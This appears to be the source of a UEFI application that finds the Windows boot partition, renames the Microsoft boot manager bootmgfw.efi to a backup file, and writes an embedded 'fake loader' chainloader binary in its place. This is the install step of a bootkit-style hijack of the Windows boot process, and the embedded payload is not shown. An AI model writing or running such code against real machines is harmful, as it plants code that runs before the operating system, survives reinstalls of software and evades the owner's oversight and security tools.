#undef __STDC_VERSION__
#include <efi.h>   
#include <uefi.h>  
#include "video.h"
#include "installer.h"

#include "chainloader_payload.h"

CHAR16 *OriginalLoader = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
CHAR16 *BackupLoader   = L"\\EFI\\Microsoft\\Boot\\bootmgfw_ms.efi";


int main(int argc, char **argv) {

    resetScreen(0);

    //finding partition with windows
    EFI_HANDLE partitionHandle = findPartition(OriginalLoader);
    if(partitionHandle == NULL) return 1;
    
    EFI_FILE_PROTOCOL* root = openRoot(partitionHandle);
    if(root == NULL) return 1;
    //renaming of loader
    EFI_STATUS status = renameFile(root, OriginalLoader, BackupLoader);

    if(EFI_ERROR(status)) return 1;

    //creating fake loader
    UINTN realSize = (UINTN)chainloader_efi_len;
    status = writeFileToRoot(root, OriginalLoader, chainloader_efi, realSize);

    root->Close(root);

    return EFI_ERROR(status) ? 1 : 0;

    return 0;

}